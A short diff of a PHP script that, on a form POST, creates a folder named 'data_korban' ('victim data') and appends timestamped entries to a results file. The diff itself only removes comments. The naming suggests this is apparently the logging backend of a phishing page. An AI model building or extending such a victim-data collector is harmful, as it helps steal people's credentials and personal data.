@@ -9,14 +9,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $folder = "data_korban";
     $filepath = $folder . "/hasil.txt";
 
-    // Cek atau buat folder
     if (!file_exists($folder)) {
         if (!mkdir($folder, 0755, true)) {
             die("Gagal membuat folder data_korban");
         }
     }
-
-    // Simpan ke file
+    
     $file = fopen($filepath, "a");
     if ($file) {
         $waktu = date("Y-m-d H:i:s");
